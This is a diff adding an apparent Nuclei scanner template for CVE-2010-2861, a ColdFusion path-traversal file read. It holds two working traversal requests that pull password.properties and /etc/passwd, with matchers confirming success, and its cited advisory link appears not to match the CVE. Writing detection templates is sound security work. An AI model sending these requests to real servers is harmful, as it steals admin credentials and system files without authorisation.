@@ -1,0 +1,48 @@
+id: CVE-2010-2861
+info:
+  name: Adobe ColdFusion Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Adobe ColdFusion 9, 9.0.1, 9.0.2 and other versions are vulnerable to an arbitrary file read in the `/CFIDE/administrator/enter.cfm` path, allowing remote attackers to read sensitive files on the server.
+  reference:
+    - https://www.adobe.com/support/security/advisories/apsa13-03.html
+  classification:
+    cvss-score: 7.5
+    cve-id: CVE-2010-2861
+    cwe-id: CWE-22
+  tags: file-read
+
+variables:
+  target_file: "/ColdFusion8/lib/password.properties"
+  alt_target_file: "/etc/passwd"
+
+http:
+  - raw:
+      - |
+        GET /CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../{{target_file}}%00en HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "rdspassword="
+          - "encrypted=true</title>"
+
+  - raw:
+      - |
+        GET /CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../{{alt_target_file}}%00en HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:x:0:0"
